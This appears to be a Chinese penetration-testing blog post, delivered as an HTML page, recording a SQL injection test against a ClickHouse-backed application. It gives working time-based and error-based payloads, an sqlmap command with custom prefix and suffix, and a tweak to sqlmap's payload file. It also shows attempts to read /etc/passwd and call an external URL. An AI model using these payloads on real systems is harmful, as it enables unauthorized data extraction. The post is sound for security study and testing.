@@ -1,0 +1,311 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ClickHouse注入测试记录 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="前期尝试根据源代码发现可以利用&amp;#39;)拼接闭合SQL语句之后，插入要注入的Payload，比如：1&amp;#39;)and sleep(3) and (&amp;#39;1，可以休眠3S。经过测试发现存在以下限制：
+
+sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回
+sleep关键词不能使用大写，因为clickhouse函数大小写敏感
+无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库
+
+虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，可能这就是脚本小子吧
+经过我不懈努力，终于让Sqlmap跑出来了可注入点:
+.&amp;#x2F;sqlmap.py -r ~&amp;#x2F;Desktop&amp;#x2F;sql.txt -v --technique&amp;#x3D;T --level 3 -v 3 --dbms MySQL --time-sec 3 --prefix &amp;quot;&amp;#39;)&amp;quot; --suffix &amp;quot;and (&amp;#39;&amp;quot; --tamper lowercase --proxy http:&amp;#x2F;&amp;#x2F;127.0.0.1:8080
+![1.png]
+为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的SLEEP(5)是自带的payload，就算是加了--tamper lowercase也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：
+
+写个Burp插件转变成小写–费时费力
+修改Sqlmap的源代码 –  这个简单
+
+于是乎，我直接编辑sqlmap目录下的data/xml/payloads/time_blind.xml，直接把SLEEP替换为sleep，然后发现会影响SLEEPTIME这个变量，再替换一次sleepTime为SLEEPTIME。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ClickHouse注入测试记录"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ClickHouse注入测试记录</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>根据源代码发现可以利用<code>&#39;)</code>拼接闭合SQL语句之后，插入要注入的Payload，比如：<code>1&#39;)and sleep(3) and (&#39;1</code>，可以休眠3S。经过测试发现存在以下限制：</p>
+<ul>
+<li>sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回</li>
+<li>sleep关键词不能使用大写，因为clickhouse函数大小写敏感</li>
+<li>无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库</li>
+</ul>
+<p>虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，<del>可能这就是脚本小子吧</del></p>
+<p>经过我不懈努力，终于让Sqlmap跑出来了可注入点:</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;sqlmap.py -r ~&#x2F;Desktop&#x2F;sql.txt -v --technique&#x3D;T --level 3 -v 3 --dbms MySQL --time-sec 3 --prefix &quot;&#39;)&quot; --suffix &quot;and (&#39;&quot; --tamper lowercase --proxy http:&#x2F;&#x2F;127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>![1.png]</p>
+<p>为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的<code>SLEEP(5)</code>是自带的payload，就算是加了<code>--tamper lowercase</code>也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：</p>
+<ol>
+<li>写个Burp插件转变成小写–费时费力</li>
+<li>修改Sqlmap的源代码 –  这个简单</li>
+</ol>
+<p>于是乎，我直接编辑sqlmap目录下的<code>data/xml/payloads/time_blind.xml</code>，直接把<code>SLEEP</code>替换为<code>sleep</code>，然后发现会影响<code>SLEEPTIME</code>这个变量，再替换一次<code>sleepTime</code>为<code>SLEEPTIME</code>。</p>
+<p>跑出来注入点没问题了，但是Sqlmap跑完之后会二次确认是否对应的数据库，会再发送几个payload二次确认数据库的类型。到此时我就傻眼了，特么那我前面干了啥(<del>不愧是脚本小子</del>)。</p>
+<h2 id="手工阶段"><a href="#手工阶段" class="headerlink" title="手工阶段"></a>手工阶段</h2><p>尝试使用报错注入的payload可以成功获取数据：</p>
+<ul>
+<li><code>&#39;) and (select currentDatabase()) and (&#39;</code></li>
+<li><code>&#39;) and ((select * from (select arrayStringConcat(*)from system.tables )a)) and (&#39;&quot;</code></li>
+<li><code>&quot;&#39;) and ((select * from (select arrayStringConcat(*)from system.databases )a)) and (&#39;&quot;</code></li>
+</ul>
+<p>以下操作显示无权限：</p>
+<ul>
+<li><code>&#39;) and (select * from url(&#39;&lt;ip&gt;&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li>
+<li><code>&#39;) and (select * from file(&#39;/etc/passwd&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li>
+</ul>
+<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><ul>
+<li>能否利用Clickhouse的<code>JDBC</code>进行JNDI注入</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.deteact.com/yandex-clickhouse-injection/">Yandex.ClickHouse injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/bytectf-2021double-sqli/">ByteCTF 2021 double sqli</a></li>
+<li><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url/">https://clickhouse.com</a></li>
+</ul>
+
+	</div>
+
+	
+	<span id="/2022/10/27/clickhouse-sql-inject.html" class="leancloud-visitors view" data-flag-title="ClickHouse注入测试记录">
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/06/23/java-agent-shell.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-10-27 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%89%8D%E6%9C%9F%E5%B0%9D%E8%AF%95"><span class="toc-article-text">前期尝试</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%8B%E5%B7%A5%E9%98%B6%E6%AE%B5"><span class="toc-article-text">手工阶段</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%81%97%E7%95%99%E9%97%AE%E9%A2%98"><span class="toc-article-text">遗留问题</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-article-text">参考资料</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
